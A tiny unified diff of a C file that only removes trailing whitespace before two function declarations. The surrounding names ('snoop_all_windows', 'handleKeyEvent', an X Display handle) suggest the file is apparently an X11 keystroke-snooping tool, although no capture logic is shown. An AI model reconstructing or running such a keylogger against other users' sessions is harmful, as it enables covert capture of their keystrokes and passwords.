@@ -18,7 +18,7 @@ Window          last_window;
 
 Display        *d;
 
-void
+void 
 snoop_all_windows(Window root, unsigned long type)
 {
 	static int      level = 0;
@@ -76,7 +76,7 @@ handleKeyEvent(XEvent *ev)
 }
 
 /* maine? */
-void
+void 
 main(int argc, char **argv)
 {
 	char           *hostname;
